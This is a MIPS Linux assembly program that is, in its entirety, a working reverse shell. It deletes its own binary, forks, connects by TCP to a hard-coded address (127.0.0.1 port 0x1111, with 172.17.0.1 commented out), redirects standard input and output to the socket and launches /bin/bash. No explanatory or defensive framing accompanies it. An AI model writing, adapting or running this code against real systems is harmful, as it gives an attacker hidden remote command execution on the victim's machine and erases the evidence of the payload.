	.text
	.globl __start
#	.set noat
__start:
	li $v0, 4010 # unlink
	lw $a0, 4($sp)
	syscall

	
	li $v0, 4002 # fork
	syscall
	bne $v0, $zero, exit

        li      $v0, 4183      #; socket
        li      $a0, 2
        li      $a1, 2         #; Also this contant is different
        li      $a2, 6
        syscall
	move $t1, $v0  # $t1 = s
	
	li $v0, 4170    # $t2 = connect
	move $a0, $t1   # Socket
	la $a1, addr
	li   $a2, 16
	syscall

	# Dup2
	li $t2, 4063
	move $v0, $t2
	move $a0, $t1
	move $a1, $zero
	syscall
	
	move $v0, $t2
	add $a1, $a1,1
	syscall
	
	move $v0, $t2
	add $a1, $a1,1
	syscall

	li $v0, 4011
	la $a0, shell
	move $a1, $zero
	move $a2, $zero
	syscall

exit:	
	# Exit
	li $v0, 4001
	li $a0, 0
	syscall


shell:  .asciz "/bin/bash"
#addr:	.quad 0x00021111ac110001
addr:	.quad 0x000211117f000001


